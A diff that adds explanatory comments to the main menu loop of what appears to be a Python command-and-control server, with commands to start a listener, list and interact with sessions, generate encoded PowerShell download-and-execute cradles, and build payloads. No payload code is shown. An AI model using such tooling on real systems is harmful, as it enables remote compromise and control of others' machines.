@@ -279,10 +279,12 @@ if __name__ == '__main__':
         try:
             command = input('Enter command#> ')
 
+            # Command to start listener
             if command == 'start listener':
                 listener_handler()
                 listener_counter += 1
 
+            # Command to list or interact with session(s)
             if command.split(' ')[0] == 'sessions':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
@@ -306,9 +308,11 @@ if __name__ == '__main__':
                     except IndexError:
                         print(f'[-] Session {num} does not exist.')
 
+            # Command to generate powershell encrypted commands - used for download and execute cradles
             if command == 'pwsh enc':
                 pwsh_enc()
 
+            # Command for exit
             if command == 'exit':
                 should_close_socket = True
                 sock.close()
@@ -321,6 +325,7 @@ if __name__ == '__main__':
                     print(
                         '[-] You cannot generate a payload without an active listener.')
 
+        # Handling CTRL + C
         except KeyboardInterrupt:
             message = input('\n[-] Do you really want to quit? (y/n)').lower()
             if message == 'y':
@@ -334,5 +339,6 @@ if __name__ == '__main__':
                 if listener_counter > 0:
                     sock.close()
                 break
+        # Hadling all other types of exceptions
         except Exception as e:
             print(e)
